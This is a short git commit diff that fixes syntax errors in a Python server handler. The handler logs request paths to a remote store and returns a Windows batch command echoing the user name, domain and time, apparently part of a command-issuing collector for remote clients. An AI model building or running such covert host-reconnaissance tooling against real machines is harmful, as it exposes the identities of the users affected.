5b2b6d87171b91bd2b52182874882a133205af10
VkcxR2ExcFhWblU9 <30832553+VkcxR2ExcFhWblU9@users.noreply.github.com>
2017-08-09 17:28:16 +0100

    Update server.py

--- server.py
+++ server.py
@@ -60,8 +60,8 @@ def x(path):
     #t = dt['t'].replace('+', ' ')
     data = dict()
     data['time'] = datetime.datetime.now().strftime("%I:%M:%S:%f%p on %B %d, %Y")
-    data.['data'] = dt
-    data.['raw'] = path[2:]
+    data['data'] = dt
+    data['raw'] = path[2:]
     fb.post('/',data)
     return "echo %TIME% %DATE% %USERNAME% %USERDOMAIN% %RANDOM% *VkcxR2ExcFhWblU9* test"
 
